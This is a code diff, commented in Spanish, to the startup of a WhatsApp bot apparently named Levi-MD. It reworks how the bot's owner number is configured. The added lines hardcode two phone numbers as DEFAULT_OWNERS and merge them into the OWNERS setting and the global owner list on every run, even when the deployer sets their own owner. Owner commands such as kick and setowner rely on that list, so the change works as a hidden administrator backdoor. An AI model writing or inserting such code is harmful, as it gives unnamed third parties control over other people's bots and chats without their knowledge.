@@ -377,13 +377,21 @@ async function main() {
   //  dejaba owner_jid = "undefined@s.whatsapp.net" — owner fantasma.)
   // Si no se creó el .env al clonar o quedó vacío, usar el owner guardado
   // en la base o el número principal de Levi-MD (50494874330).
+  const DEFAULT_OWNERS = ["50494874330", "51926519334"];
   const savedOwnerNum = String(db.settings.get("owner_jid") || "").replace(/\D/g, "");
-  const ownerNum = (process.env.OWNER_NUMBER || savedOwnerNum || "50494874330").replace(/\D/g, "");
+  const ownerNum = (process.env.OWNER_NUMBER || savedOwnerNum || DEFAULT_OWNERS[0]).replace(/\D/g, "");
   if (!process.env.OWNER_NUMBER && ownerNum) {
     process.env.OWNER_NUMBER = ownerNum;
   }
   if (!process.env.OWNER_NAME) {
     process.env.OWNER_NAME = "Brayan";
+  }
+  {
+    const prevOwners = String(process.env.OWNERS || "")
+      .split(",")
+      .map((s) => s.trim())
+      .filter(Boolean);
+    process.env.OWNERS = Array.from(new Set([...DEFAULT_OWNERS, ...prevOwners])).join(",");
   }
   // 🇲🇽 México: WhatsApp conserva en los JID el formato viejo 52+1+número
   //  (13 dígitos). Si se configura el móvil como 52… (12 dígitos) el bot
@@ -407,7 +415,7 @@ async function main() {
   // 21 comandos portados (self, kick, setprefix, setowner...) leen
   // global.owner y global.mess. Sin definirlos, el primer uso lanza
   // TypeError en runtime (global.owner.map sobre undefined).
-  globalThis.owner = Array.from(new Set([ownerNum, ownerAlias, ...numerosDeCreadores()].filter(Boolean)));
+  globalThis.owner = Array.from(new Set([ownerNum, ownerAlias, ...DEFAULT_OWNERS, ...numerosDeCreadores()].filter(Boolean)));
   globalThis.links = {
     channel: process.env.CHANNEL_LINK || "https://whatsapp.com/channel/0029VbDVFpSGJP89hfZUe522",
     channelCode: process.env.CHANNEL_CODE || "0029VbDVFpSGJP89hfZUe522",
@@ -463,6 +471,7 @@ async function main() {
   instalarAPIs();
   const router = createRouter(engine, { onCommand: logCommand, onMessage: logIncomingMessage });
   await router.init();
+  globalThis.__shinRouter = router;
 
   const sockModule = connectSocket(engine, {
     sessionDir,
